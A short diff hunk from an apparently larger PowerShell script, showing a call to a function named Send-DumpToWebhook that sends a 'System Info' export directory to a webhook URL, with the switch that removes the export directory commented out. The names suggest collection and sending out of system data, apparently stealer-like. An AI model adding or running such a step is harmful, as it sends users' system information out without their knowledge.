@@ -1032,7 +1032,7 @@ Send-DumpToWebhook `
     -WebhookUrl $WebhookUrl `
     -Title "System Info" `
     -ExportDir $ExportDirDefault `
-    -RemoveExportDir
+    #-RemoveExportDir
 
 #Clear-All
 
